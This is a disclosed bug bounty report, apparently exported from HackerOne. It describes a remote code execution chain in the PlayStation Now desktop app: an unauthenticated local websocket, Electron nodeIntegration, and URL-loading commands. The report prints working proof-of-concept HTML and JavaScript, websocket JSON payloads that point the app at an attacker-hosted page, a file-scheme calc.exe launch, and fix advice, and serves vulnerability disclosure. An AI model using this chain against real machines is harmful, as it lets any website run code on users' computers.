{
  "id": 873614,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzM2MTQ=",
  "url": "https://hackerone.com/reports/873614",
  "title": "Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-05-13T18:44:26.671Z",
  "submitted_at": "2020-05-13T18:44:26.671Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "parsiya",
    "url": "/parsiya",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ib0wbmyojvrb72ogxgt39cst42g0/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%22QJVt_Wnh.jpg%22%3B%20filename%2A%3DUTF-8%27%27QJVt_Wnh.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVF4PHCL7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T080509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDguhK6TdXVdQ3RUynI5PKh5IBQuz3fCIv0RB9aA%2B0foAiAayFqT8jNhVwyLfGI7NzUAqv%2Bk0l3w9UIH0pHGthBCEyq6BQj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM8n9RG0dJ%2BRO3kY1FKo4F0W9fEZIeDhi10XDRKf49Az2ijyGknDncSGOVndFfN6dQ1JYqlsolzcjg6MfpKIXkzLssgcHUI%2BzLz7HdYGwLKSqWtfG5kabt6wYvO8Sfr6BvRvBMNHLddvutqdc%2Fzp%2BKkPpw6FV4mpRW%2FEo40DFpdnhLRaIOGUslOycAXBGH5i9%2FWQzH4ANj0MpRptspQbsO0pXEYg%2F8J2inQDc%2BrXgAitOrS83CqGazdQzWtC0QApcXIC7aOWFPkRkfDJyWsO%2BUT9GrDpYtKtGGq%2FmTXRI7DVjfQdjXvWbvduI5XrR%2B6O%2Bm5pzWE%2BRi%2B5pZFKcGZfg%2BI2aJ9rQfpeYwuU8HiE23IY219eHdvG%2F8GyxM%2FWkW1mRGt0GF8xlATnCKffGHilgRiU0a0WZ9tYXKZIJGKg7%2BWRGg8Lx1lT3Ai4bctxGfV6h1t0bhZyGitEfx8fR5Vy4ktrGmiBwmB5AIud%2BRsH8r7%2FBlpZb8rumO%2F6FaooBiKaFqhpJdslLCsN1BhrA5GEnNHotH6CB7Dr%2B5lv4qovDXNLX4dV5%2B%2BdgQmo10tqCkO%2FQRji%2BIA%2BE4lsF0XJ4oXj%2B90ZEftN2MabpKHGJ2FjufPHBbS4F5x0Li6DoaViXu2hIHVnocAEQJ1T%2FfXyOnUzZ2vx0ULz3dSfAPC%2BDQI%2B%2FkqTLF5tEFJCpMsGqa2ucUc5q0%2BzidXYyqu6tV9AbPYvYtAseRm6HPz%2FyK8bnKv4qIoliHyFauo5LRZZMv52Z44OPYpmUpK%2F7aYFVdFCePhSFIZeiuTmzXuh5SV%2FBmYieVpJUtwYAK1VLuper%2FlrvPfsVVqVve9hHToR4hkGmMzBD01pqN9spArXw%2FzMWW9xRghmKxNwHSWCCBEWyY7%2BiTMPSMvsYGOrIBVRE409BaZllJxy11mSYcqpVByatvSDY7GSjvU2FQc3Fg%2FnI2RsBuD%2F0gW%2FaYozc%2Fn2SGzpgP5GVBO%2FcLY%2BUgEb7EOvYDBvf77W8atCI4KTZDDvbbf3jEStwx3oa87G596d0eceAwMMMZHdYh3mVIqenVj0TVSyt2%2FNrg28GpCX%2BBTAQ7Oj3WOYkacbLEupe3J%2BRlDCVRapaL5zk6xIyUsGmpVQWFOS4Q5PEv%2BMLPrCdMDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2eb76e36c03e4c43b8117424fca67babe5013c7f8b8e6fb945e1397f0ec8deec"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 44879,
    "url": "https://hackerone.com/playstation",
    "handle": "playstation",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "PlayStation",
      "twitter_handle": "PlayStation",
      "website": "https://www.playstation.com",
      "about": "Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-12-04T18:04:55.058Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-28T15:11:08.770Z",
  "team_member_agreed_on_going_public_at": "2020-12-04T18:04:54.940Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "bounty_amount": "15000.0",
  "formatted_bounty": "$15,000",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 769,
  "voters": [
    "pretorian",
    "acut3",
    "axelomega",
    "pmnh",
    "arist0phanes",
    "tokyoenigma",
    "orange303",
    "mr-medi",
    "b19r8a14",
    "panya",
    "and 759 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.6,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 40737,
    "asset_type": "OTHER",
    "asset_identifier": "PlayStation Network",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 25733,
      "category": "team",
      "content": "-",
      "updated_at": "2020-12-04T18:04:46.339Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 319901,
        "username": "serv",
        "name": "s",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2018-07-30T18:21:23.048Z",
        "url": "https://hackerone.com/serv",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MjAwMjM4NCwicHVyIjoiYmxvYl9pZCJ9fQ==--d2b8dc30ceb7e60f5c7cc2b843535b60cc1bef3e/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/Screen%20Shot%202022-06-02%20at%2010.19.28%20PM.png"
        }
      }
    },
    {
      "id": 25536,
      "category": "researcher",
      "content": "# Summary\nThe PlayStation Now application version `11.0.2` is vulnerable to remote code execution (RCE). Any website loaded in any browser on the same machine can run arbitrary code on the machine through a vulnerable websocket connection.\n\n1. The local websocket server at `localhost:1235` does not check the origin of incoming requests.\n    1. This allows websites loaded in browsers on the same machine to send requests to the websocket server.\n    2. Websockets are not bound by the Same-Origin Policy so the websocket server has to do this manually.\n2. psnow launches an Electron application named `AGL`.\n    1. It's possible to tell AGL to load a specific website with a command sent to the websocket server.\n    2. As a result, the websites above can tell AGL to load any remote URL.\n    3. It's also possible to tell `AGL` to run any local application via the `setUrlDefaultBrowser` command.\n3. The AGL Electron application has `nodeIntegration: true` so JavaScript running in any loaded URL can spawn new processes.\n    1. So any URL loaded in the AGL application can run code on the target machine.\n\nChaining these three issues gives us RCE.\n\n# Description\nThe PlayStation Now application (`psnow` moving forward) is an online streaming application for playing PlayStation games. Version `11.0.2` is the current version at the time of writing. The latest version can be downloaded from https://download-psnow.playstation.com/downloads/psnow/pc/latest.\n\nIt has two major components: `QAS` and `AGL`.\n\n## QAS\n`QAS` is an executable named `psnowlauncher.exe` and is a Qt5 desktop application. This is the main application that is executed when the user runs psnow. The default installation location is `C:\\Program Files (x86)\\PlayStationNow\\psnowlauncher.exe`.\n\nNote: Running it in a Virtual Machine (VM) returns a warning. This can be ignored for this walkthrough.\n\nAfter launch, it runs a different application called `AGL`. The following picture is the complete list of processes in Process Monitor.\n\nProcesses in procmon:\n\n{F827146}\n\nThe QAS application also runs a websocket server at `localhost:1235`. `netstat -anb` in an elevated command line tells us about it:\n\nwebsocket server:\n\n{F827147}\n\n## AGL\n`AGL` is an Electron application. In a typical execution, it's spawned by QAS. In the current version, it's run with this `url` command line parameter:\n\n* `\"C:\\Program Files (x86)\\PlayStationNow\\agl\\agl.exe\" --url=https://psnow.playstation.com/app/1.10.43/105/00d3603f8/`\n\nThis is the URL of the page that will be initially loaded by the AGL application.\n\nAGL execution\n\n{F827149}\n\n### Issue 1: nodeIntegration Set to true\n`nodeIntegration` is the ability for the JavaScript running in an Electron [BrowserWindow][browser-window] to access the Node.js APIs. The default value is `false` but it is set to `true` in AGL. Any JavaScript loaded by AGL will be able to spawn processes on the machine. This can lead to arbitrary code execution. The AGL application performs no checks on what URLs it loads.\n\n[browser-window]: https://www.electronjs.org/docs/api/browser-window\n\nWe can check this by running AGL from the command line with a URL that contains some Node code. The following code spawns a new processes and runs the Windows Calculator app (calc).\n\n```html\n<html>\n    <head>\n        <title>This should pop calc on Windows</title>\n    </head>\n    <body>\n        <script>\n            require('child_process')\n            .exec('calc')\n        </script>\n    </body>\n</html>\n```\n\nI have stored this payload in an S3 bucket. If we load that remote URL in AGL we can see calc spawning. To reproduce, run the following command in a VM and see AGL running the calculator application:\n\n`\"C:\\Program Files (x86)\\PlayStationNow\\agl\\agl.exe\" --url=https://[redacted].s3.us-east-1.amazonaws.com/node.html`\n\nPopping calc:\n\n{F827156}\n\nWe can see the new processes in Process Monitor:\n\n{F827151}\n\nThis is not that useful. We can run code on our own machine, WOW! As Raymond Chen said [It rather involved being on the other side of this airtight hatchway][hatchway].\n\n[hatchway]: https://devblogs.microsoft.com/oldnewthing/20060508-22/?p=31283\n\n## Proxying The Applications\nWe can proxy psnow with Burp. Use the Windows proxy settings (WinINET proxy settings).\n\n1. Run `control.exe inetcpl.cpl,,4`. This opens the Windows proxy settings without having to open Internet Explorer.\n2. Click on `LAN Settings` and set the proxy.\n    1. Make sure nothing under `Automatic Configuration` is checked.\n    2. Make sure the `Bypass proxy server for local addresses` is **NOT checked**.\n3. Set the proxy to the listener, Burp's default is `127.0.0.1:8080`.\n4. Add Burp's Certificate Authority (CA) to the Windows certificate store.\n    1. https://portswigger.net/support/installing-burp-suites-ca-certificate-in-internet-explorer\n    2. The instructions mention Internet Explorer but it's actually for Windows.\n\n### Identifying Traffic in Burp\nIn Burp, we will see traffic to/from both QAS and AGL. There is other traffic (e.g, browser traffic, Windows update). The traffic from psnow has the word `gkApollo` in its `User-Agent` header.\n\nThe user-agent for requests coming from the two applications has more indicators:\n\n* QAS is the Qt5 app and has `QtWebEngine/5.5.1`.\n* AGL is based on Electron and it has `Electron/1.4.16` and `playstation-now/0.0.0`.\n\nI am using a Burp extension named [Request Highlighter][request-highlighter] to highlight requests based on these words in the user-agent.\n\n[request-highlighter]: https://portswigger.net/bappstore/11729a617d8d4d3b87c82e34b71885c3\n\nIn my setup, AGL (Electron) is yellow and QAS (Qt5) is blue.\n\n{F827153}\n\n## Local Websocket Server\nQAS starts a local websocket server on port `1235`. Then the website loaded in AGL (in this case \"psnow.playstation.com/app/\") connects to it and sends commands to the server.\n\n### Issue 2: Local Websocket Server does not Check the Origin Header\nThis is a vulnerable setup for seamless communication between a website and a desktop application. A website sends requests to a local webserver to do something (e.g., launch an application). This setup is vulnerable if the local server does not check the Origin header and/or where the request is coming from.\n\nSome examples of other vulnerable setups:\n\n[Tavis Ormandy][taviso-twitter] from Google Project Zero found a very similar setup in Logitech Options.\n\n* https://bugs.chromium.org/p/project-zero/issues/detail?id=1663\n\n[taviso-twitter]: https://twitter.com/taviso\n\nAnother by TavisO for TrendMicro. Not websocket but involved a local webserver: https://bugs.chromium.org/p/project-zero/issues/detail?id=693\n\nZoom used a local webserver to automatically launch the application from the website. Disclosure by [Jonathan Leitschuh][jon-1].\n\n[jon-1]: https://twitter.com/JLLeitschuh\n\n* https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5\n\n**Why is this bad?** Any website can send these commands. This means I can put JavaScript code on my own website. If a user running psnow opens my website on the same machine (in any browser), my website connects to `http://localhost:1235` and sends requests to the websocket server. These requests will be processed.\n\n### Yet Another Chat Application as Proof of Concept\nI stole the client code of a websocket chat app and modified it to simulate the evil website. This small app connects to `ws://localhost:1235`, prints any message received and allows us to send messages at will. You can see the source at:\n\n* https://[redacted].s3.amazonaws.com/agl-poc/chat-ws.html\n* Open the page in a browser in a different machine and see the source. It's simple enough that I could understand it.\n\n1. Start the psnow app in a VM.\n2. Open the above URL in a browser in the same VM.\n3. See the websocket messages from the psnow app in the browser.\n    1. If we keep the chat app running, it will keep printing messages received from the client.\n4. Send any message to the local server via the text field.\n\n{F827145}\n\n## Websocket Messages\nNow we need to look into the websocket messages and how we can exploit them.\n\nAfter opening the initial URL at `https://psnow.playstation.com/app/1.10.43/105/00d3603f8/` we can see the `Connection: Upgrade` request to this server from `psnow.playstation.com`. This is coming from the psnow website loaded in AGL. The initial request is a typical websocket handshake.\n\n{F827150}\n\nNow we can switch to the `Proxy > Websockets history` tab in Burp to see the websocket messages.\n\n{F827152}\n\nAll the requests are in JSON (probably created by `JSON.stringify`). The interesting ones start with `command`. For example:\n\n```json\n{\n  \"command\": \"isMicConnected\",\n  \"params\": {},\n  \"source\": \"AGL\",\n  \"target\": \"QAS\"\n}\n```\n\n* `command`: What to do.\n* `params`: Command parameters.\n* `source`: The program issuing the command.\n* `target`: The program running the command.\n\nBoth target and source can be the same app. I do not think it really matters what the source is. I think only `target` is mandatory.\n\nWe can search for more commands in websocket messages. The most important command is `setUrl`. There are more commands in the source of the Electron app (unpack `app.asar` and search for `commandHandler`) but this is the most useful along with `setUrlDefaultBrowser` (opens a URL in the default browser on the machine).\n\n{F827154}\n\n```json\n{\n  \"command\": \"setUrl\",\n  \"params\": {\n    \"url\": \"https://psnow.playstation.com/app/1.10.43/105/00d3603f8/\"\n  },\n  \"source\": \"AGL\",\n  \"target\": \"QAS\"\n}\n```\n\nThis is AQL telling QAS to load this URL. QAS will then go and load that URL. We can send this request to Burp Repeater and send the message again with a different URL. For example, let's tell QAS to load `https://example.net`.\n\n{F827155}\n\nBut this is not fun. We want AGL to load websites and not QAS. **WHAT IF** we switched target and source?\n\n```\n{\"command\":\"setUrl\",\"params\":{\"url\":\"https://example.net\"},\"source\":\"QAS\",\"target\":\"AGL\"}\n```\n\nThis command will tell AGL (the Electron app) to load `example.net`. The gif has been minimized, please click on it to enlarge it:\n\n{F827144}\n\n\nLater, I found out that we can use another TavisO bug to get RCE another way. https://bugs.chromium.org/p/project-zero/issues/detail?id=693\n\nWe can abuse the `setUrlDefaultBrowser` command. It gets passed to `shell.openExternal(url)` and allows the `file` scheme.\n\nSo the following command should pop calc:\n\n```\n{\"command\":\"setUrlDefaultBrowser\",\"params\":{\"url\":\"file:///c:/windows/system32/calc.exe\"},\"source\":\"QAS\",\"target\":\"AGL\"}\n```\n\nNote: `QAS` does not have this command.\n\nWebsockets are not bound by the Same-Origin Policy so any website can send these messages. For an explanation please see https://blog.securityevaluators.com/websockets-not-bound-by-cors-does-this-mean-2e7819374acc.\n\n## Issue 3: You Can Tell AGL to Load Arbitrary Websites\nA single websocket message is enough to make AGL load any URL. There are no restrictions here. This is not great, considering we saw what bad code on a website can do to AGL.\n\n## Putting Everything Together\nSo far we have established three things:\n\n1. If a website with Node code is loaded in AGL, we can run arbitrary on the target's machine.\n2. Any website opened in the browser on a machine with psnow running can connect to the local websocket and send messages.\n3. A websocket command with `setUrl` or `setUrlDefaultBrowser` can tell AGL to load any URL.\n\n### Possible Attack Scenario\n\n1. User is running psnow on their machine.\n    1. Note that when the users close the psnow window it gets minimized to tray and is still running. So there's a good chance that psnow is running  if they have used it in the same session. The websocket server is still running when the application is minimized.\n2. The user opens a website in their browser. Any browser will do.\n    1. Someone can post a link to a website with bad code in chat/Discord, it could be a link on forums. The possibilities are endless.\n3. The website in the browser connects to the websocket server at `ws://localhost:1235`.\n4. The website sends a message to the websocket server. The message tells AGL to load another website that contains node code.\n    1. `{\"command\":\"setUrl\",\"params\":{\"url\":\"https://[redacted].s3.us-east-1.amazonaws.com/node.html\"},\"source\":\"QAS\",\"target\":\"AGL\"}`\n    2. Alternatively, it can abuse the `setUrlDefaultBrowser` command.\n5. AGL loads the new website. Arbitrary code runs on the user's machine.\n6. ???\n7. RCE.\n\n## Steps To Reproduce:\nIf you have read up until here, you deserve a calc popping gif.\n\n1. Run psnow in a VM.\n2. Go to the following URL in a browser on the same machine:\n    1. https://[redacted].s3.amazonaws.com/agl-poc/calc-ws.html\n3. Watch calc pop.\n4. Optionally, paste the following command in the text field and press send to see calc pop again.\n    1. `{\"command\":\"setUrl\",\"params\":{\"url\":\"https://[redacted].s3.us-east-1.amazonaws.com/node.html\"},\"source\":\"QAS\",\"target\":\"AGL\"}`\n    2. You can also do other fun things like enabling dev tools.\n\nThe code in `calc-ws` is similar to the chat code. After the socket to the local websocket server opens, the payload above is sent. See the modification heres:\n\n```js\nlet url = 'ws://localhost:1235/'\n\nlet socket = new WebSocket(url);\n\nlet payload = '{\"command\":\"setUrl\",\"params\":{\"url\":\"https://[redacted].s3.us-east-1.amazonaws.com/node.html\"},\"source\":\"QAS\",\"target\":\"AGL\"}';\n\n// send the payload when the socket is opened.\nsocket.onopen = function(event) {\n  showMessage('before payload');\n  socket.send(payload);\n  showMessage('after payload');\n};\n```\n\nThe following gif shows the whole chain. Again, please see it in full-size.\n\n{F827148}\n\n### Bonus: Minor Issue 0: Websocket Server Listening on 0.0.0.0\nThe application is listening on all interfaces (`0.0.0.0`) which is problematic. This is also not fun because the Windows firewall prompt will pop up when its executed for the first time. Meaning anyone who can contact this port **might** be able to send commands to this websocket server.\n\n## Remediation or How Can We Fix This?\n\n* Quick and effective win: The local websocket server should validate the `Origin` header of the incoming request and only allow requests from good Origins specified in a list.\n    * This is the same recommendation by TavisO in https://bugs.chromium.org/p/project-zero/issues/detail?id=1663. And he is much smarter than I will ever be.\n* Bonus win: Do not listen on all interfaces, bind the server to `localhost`.\n\n## Impact\nAttackers can run code on users' machines. They can get to the other side of the airtight hatchway.",
      "updated_at": "2020-12-07T03:50:32.073Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 69212,
        "username": "parsiya",
        "name": "Parsia",
        "bio": "I'd rather play videogames",
        "cleared": false,
        "verified": true,
        "website": "https://parsiya.net",
        "location": "",
        "created_at": "2016-04-14T01:41:09.155Z",
        "url": "https://hackerone.com/parsiya",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ib0wbmyojvrb72ogxgt39cst42g0/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%22QJVt_Wnh.jpg%22%3B%20filename%2A%3DUTF-8%27%27QJVt_Wnh.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVF4PHCL7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T080509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDguhK6TdXVdQ3RUynI5PKh5IBQuz3fCIv0RB9aA%2B0foAiAayFqT8jNhVwyLfGI7NzUAqv%2Bk0l3w9UIH0pHGthBCEyq6BQj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM8n9RG0dJ%2BRO3kY1FKo4F0W9fEZIeDhi10XDRKf49Az2ijyGknDncSGOVndFfN6dQ1JYqlsolzcjg6MfpKIXkzLssgcHUI%2BzLz7HdYGwLKSqWtfG5kabt6wYvO8Sfr6BvRvBMNHLddvutqdc%2Fzp%2BKkPpw6FV4mpRW%2FEo40DFpdnhLRaIOGUslOycAXBGH5i9%2FWQzH4ANj0MpRptspQbsO0pXEYg%2F8J2inQDc%2BrXgAitOrS83CqGazdQzWtC0QApcXIC7aOWFPkRkfDJyWsO%2BUT9GrDpYtKtGGq%2FmTXRI7DVjfQdjXvWbvduI5XrR%2B6O%2Bm5pzWE%2BRi%2B5pZFKcGZfg%2BI2aJ9rQfpeYwuU8HiE23IY219eHdvG%2F8GyxM%2FWkW1mRGt0GF8xlATnCKffGHilgRiU0a0WZ9tYXKZIJGKg7%2BWRGg8Lx1lT3Ai4bctxGfV6h1t0bhZyGitEfx8fR5Vy4ktrGmiBwmB5AIud%2BRsH8r7%2FBlpZb8rumO%2F6FaooBiKaFqhpJdslLCsN1BhrA5GEnNHotH6CB7Dr%2B5lv4qovDXNLX4dV5%2B%2BdgQmo10tqCkO%2FQRji%2BIA%2BE4lsF0XJ4oXj%2B90ZEftN2MabpKHGJ2FjufPHBbS4F5x0Li6DoaViXu2hIHVnocAEQJ1T%2FfXyOnUzZ2vx0ULz3dSfAPC%2BDQI%2B%2FkqTLF5tEFJCpMsGqa2ucUc5q0%2BzidXYyqu6tV9AbPYvYtAseRm6HPz%2FyK8bnKv4qIoliHyFauo5LRZZMv52Z44OPYpmUpK%2F7aYFVdFCePhSFIZeiuTmzXuh5SV%2FBmYieVpJUtwYAK1VLuper%2FlrvPfsVVqVve9hHToR4hkGmMzBD01pqN9spArXw%2FzMWW9xRghmKxNwHSWCCBEWyY7%2BiTMPSMvsYGOrIBVRE409BaZllJxy11mSYcqpVByatvSDY7GSjvU2FQc3Fg%2FnI2RsBuD%2F0gW%2FaYozc%2Fn2SGzpgP5GVBO%2FcLY%2BUgEb7EOvYDBvf77W8atCI4KTZDDvbbf3jEStwx3oa87G596d0eceAwMMMZHdYh3mVIqenVj0TVSyt2%2FNrg28GpCX%2BBTAQ7Oj3WOYkacbLEupe3J%2BRlDCVRapaL5zk6xIyUsGmpVQWFOS4Q5PEv%2BMLPrCdMDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2eb76e36c03e4c43b8117424fca67babe5013c7f8b8e6fb945e1397f0ec8deec",
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/ib0wbmyojvrb72ogxgt39cst42g0/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a?response-content-disposition=inline%3B%20filename%3D%22QJVt_Wnh.jpg%22%3B%20filename%2A%3DUTF-8%27%27QJVt_Wnh.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVF4PHCL7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T080509Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIDguhK6TdXVdQ3RUynI5PKh5IBQuz3fCIv0RB9aA%2B0foAiAayFqT8jNhVwyLfGI7NzUAqv%2Bk0l3w9UIH0pHGthBCEyq6BQj%2B%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM8n9RG0dJ%2BRO3kY1FKo4F0W9fEZIeDhi10XDRKf49Az2ijyGknDncSGOVndFfN6dQ1JYqlsolzcjg6MfpKIXkzLssgcHUI%2BzLz7HdYGwLKSqWtfG5kabt6wYvO8Sfr6BvRvBMNHLddvutqdc%2Fzp%2BKkPpw6FV4mpRW%2FEo40DFpdnhLRaIOGUslOycAXBGH5i9%2FWQzH4ANj0MpRptspQbsO0pXEYg%2F8J2inQDc%2BrXgAitOrS83CqGazdQzWtC0QApcXIC7aOWFPkRkfDJyWsO%2BUT9GrDpYtKtGGq%2FmTXRI7DVjfQdjXvWbvduI5XrR%2B6O%2Bm5pzWE%2BRi%2B5pZFKcGZfg%2BI2aJ9rQfpeYwuU8HiE23IY219eHdvG%2F8GyxM%2FWkW1mRGt0GF8xlATnCKffGHilgRiU0a0WZ9tYXKZIJGKg7%2BWRGg8Lx1lT3Ai4bctxGfV6h1t0bhZyGitEfx8fR5Vy4ktrGmiBwmB5AIud%2BRsH8r7%2FBlpZb8rumO%2F6FaooBiKaFqhpJdslLCsN1BhrA5GEnNHotH6CB7Dr%2B5lv4qovDXNLX4dV5%2B%2BdgQmo10tqCkO%2FQRji%2BIA%2BE4lsF0XJ4oXj%2B90ZEftN2MabpKHGJ2FjufPHBbS4F5x0Li6DoaViXu2hIHVnocAEQJ1T%2FfXyOnUzZ2vx0ULz3dSfAPC%2BDQI%2B%2FkqTLF5tEFJCpMsGqa2ucUc5q0%2BzidXYyqu6tV9AbPYvYtAseRm6HPz%2FyK8bnKv4qIoliHyFauo5LRZZMv52Z44OPYpmUpK%2F7aYFVdFCePhSFIZeiuTmzXuh5SV%2FBmYieVpJUtwYAK1VLuper%2FlrvPfsVVqVve9hHToR4hkGmMzBD01pqN9spArXw%2FzMWW9xRghmKxNwHSWCCBEWyY7%2BiTMPSMvsYGOrIBVRE409BaZllJxy11mSYcqpVByatvSDY7GSjvU2FQc3Fg%2FnI2RsBuD%2F0gW%2FaYozc%2Fn2SGzpgP5GVBO%2FcLY%2BUgEb7EOvYDBvf77W8atCI4KTZDDvbbf3jEStwx3oa87G596d0eceAwMMMZHdYh3mVIqenVj0TVSyt2%2FNrg28GpCX%2BBTAQ7Oj3WOYkacbLEupe3J%2BRlDCVRapaL5zk6xIyUsGmpVQWFOS4Q5PEv%2BMLPrCdMDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ed4ee8ed8c329d87014e3f2c27c7d2e5aa9ab835ef302fe59f5bf6c7be0e7496",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTI5NjcwNiwicHVyIjoiYmxvYl9pZCJ9fQ==--dd74ba76dc13569d2b177e004f1d0053a4835f96/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--cf3aeca803d1baf476958c689ca7b472a4cb54f1/QJVt_Wnh.jpg"
        }
      }
    }
  ]
}
